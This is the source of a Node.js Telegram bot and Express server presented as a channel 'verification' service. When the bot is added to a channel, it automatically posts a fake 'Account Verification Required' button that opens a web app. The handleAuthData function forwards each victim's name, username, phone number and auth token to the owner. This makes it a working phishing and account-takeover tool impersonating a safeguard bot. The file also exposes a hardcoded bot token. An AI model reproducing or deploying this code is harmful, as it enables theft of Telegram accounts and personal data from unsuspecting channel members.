const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const app = express();
const port = process.env.PORT || 3000;

// ✅ YOUR CREDENTIALS ARE INSERTED HERE
const token = process.env.BOT_TOKEN || '8108422649:AAENF0rHzy1GEekebaZgdRFMy6mtxJWvDmw';
const ownerId = process.env.OWNER_ID || '6037132084';

// Use Webhooks for production (on Render), fall back to polling for local development
const bot = new TelegramBot(token, {
  polling: process.env.NODE_ENV !== 'production',
  webHook: process.env.NODE_ENV === 'production'
});

// If we are in production (on Render), set the webhook
if (process.env.NODE_ENV === 'production') {
  const webhookUrl = `https://my-telegram-bot-hiz4.onrender.com/bot${token}`;
  bot.setWebHook(webhookUrl);
}

// Store channels where the bot has already posted (to avoid duplicate posts)
const postedChannels = new Set();

// Handle when bot is added to a channel/group
bot.on('my_chat_member', async (update) => {
    const chat = update.chat;
    const newStatus = update.new_chat_member.status;
    const oldStatus = update.old_chat_member ? update.old_chat_member.status : null;
    
    console.log(`Bot status changed in ${chat.title || chat.id}: ${oldStatus} -> ${newStatus}`);
    
    // Check if bot was added as admin to a channel or group
    if ((chat.type === 'channel' || chat.type === 'supergroup') && 
        (newStatus === 'administrator' || newStatus === 'member')) {
        
        // Small delay to ensure bot has proper permissions
        setTimeout(() => {
            postLoginMessage(chat.id);
        }, 2000);
        
        // Notify owner
        bot.sendMessage(ownerId, 
            `🤖 Bot was added to ${chat.type}: ${chat.title || 'Unknown'} (${chat.id})\n` +
            `Status: ${newStatus}\n` +
            `Auto-posting login message...`
        );
    }
    
    // If bot was removed from channel
    if (newStatus === 'kicked' || newStatus === 'left') {
        postedChannels.delete(chat.id);
        bot.sendMessage(ownerId, `❌ Bot was removed from: ${chat.title || chat.id}`);
    }
});

// Function to post the login message
function postLoginMessage(chatId) {
    const loginButton = {
        reply_markup: {
            inline_keyboard: [[
                {
                    text: "🔐 CLICK HERE TO VERIFY",
                    web_app: { url: `https://my-telegram-bot-hiz4.onrender.com` }
                }
            ]]
        }
    };
    
    const message = `🔐 **Account Verification Required**\n\n` +
                   `Click the button below to verify your Telegram account and gain access to this channel.\n\n` +
                   `✅ Quick & Secure\n` +
                   `✅ One-time verification\n` +
                   `✅ Instant access`;
    
    bot.sendMessage(chatId, message, {
        ...loginButton,
        parse_mode: 'Markdown'
    }).then(() => {
        postedChannels.add(chatId);
        console.log(`Successfully posted login message to ${chatId}`);
    }).catch((error) => {
        console.error(`Failed to post to ${chatId}:`, error.message);
        // Retry with simpler message if markdown fails
        bot.sendMessage(chatId, "🔐 CLICK BELOW TO VERIFY YOUR ACCOUNT", loginButton)
            .catch(err => console.error(`Retry also failed: ${err.message}`));
    });
}

// Manual command to post login (backup option)
bot.onText(/\/postlogin/, (msg) => {
    // Check if user is owner or if it's in a channel
    if (msg.from.id.toString() === ownerId || 
        msg.chat.type === 'channel' || 
        msg.chat.type === 'supergroup') {
        postLoginMessage(msg.chat.id);
    } else {
        bot.sendMessage(msg.chat.id, "⚠️ This command can only be used by the bot owner or in channels/groups.");
    }
});

// Command to check bot status (for debugging)
bot.onText(/\/status/, (msg) => {
    if (msg.from.id.toString() === ownerId) {
        bot.sendMessage(msg.chat.id, 
            `🤖 Bot Status:\n` +
            `- Running on: ${process.env.NODE_ENV === 'production' ? 'Production' : 'Development'}\n` +
            `- Posted to ${postedChannels.size} channels\n` +
            `- Server URL: https://my-telegram-bot-hiz4.onrender.com`
        );
    }
});

// Handle /start command with verification parameter
bot.onText(/\/start(.*)/, (msg, match) => {
    const startParam = match[1].trim();
    
    // If user came from channel verification link
    if (startParam.startsWith('verify_')) {
        const channelId = startParam.replace('verify_', '');
        
        // Send the web app button in private chat
        const webAppButton = {
            reply_markup: {
                inline_keyboard: [[
                    {
                        text: "🔐 VERIFY YOUR ACCOUNT",
                        web_app: { url: `https://my-telegram-bot-hiz4.onrender.com` }
                    }
                ]]
            }
        };
        
        bot.sendMessage(msg.chat.id, 
            `Welcome! 👋\n\n` +
            `Please verify your Telegram account to gain access to the channel.\n\n` +
            `Click the button below to complete verification:`,
            webAppButton
        );
    } else {
        // Regular start command
        bot.sendMessage(msg.chat.id, 
            `Welcome to the Verification Bot! 🤖\n\n` +
            `I help verify Telegram accounts for channel access.\n\n` +
            `Add me to your channel as admin and I'll post the verification message automatically.`
        );
    }
});

// Handle data from Mini App
bot.on('message', (msg) => {
    if (msg.web_app_data) {
        try {
            const data = JSON.parse(msg.web_app_data.data);
            if (data.type === 'auth_data') {
                handleAuthData(msg, data);
            }
        } catch (e) {
            console.error('Error parsing web app data:', e);
        }
    }
});

function handleAuthData(msg, data) {
    const userInfo = data.user;
    
    // 1. Send confirmation to the user
    bot.sendMessage(msg.chat.id, "✅ Verified successfully! You now have access to the channel.");
    
    // 2. Prepare detailed message for the owner
    const authMessage = `
🔐 **New Account Verification**

👤 **User ID:** \`${userInfo.id}\`
📛 **Name:** ${userInfo.first_name} ${userInfo.last_name || ''}
🔗 **Username:** ${userInfo.username ? '@' + userInfo.username : 'Not set'}
📞 **Phone:** ${userInfo.phone_number || 'Not provided'}

**From Chat:** ${msg.chat.title || msg.chat.id}
**Time:** ${new Date().toLocaleString()}

${userInfo.auth_token ? `\n🔑 **Auth Token:**\n\`${userInfo.auth_token}\`` : ''}
    `;
    
    // 3. Send the info to owner
    bot.sendMessage(ownerId, authMessage, { parse_mode: 'Markdown' })
        .catch(err => {
            // Fallback without markdown if it fails
            bot.sendMessage(ownerId, authMessage.replace(/[*`]/g, ''));
        });
}

// Webhook endpoint for production
app.post(`/bot${token}`, express.json(), (req, res) => {
    bot.processUpdate(req.body);
    res.sendStatus(200);
});

// Basic server to serve the HTML page
app.use(express.static('public'));
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

app.listen(port, () => {
    console.log(`🚀 Server running on port ${port}`);
    console.log(`🤖 Bot username: @safeeguardddddbot`);
    console.log(`📍 Environment: ${process.env.NODE_ENV === 'production' ? 'Production' : 'Development'}`);
});
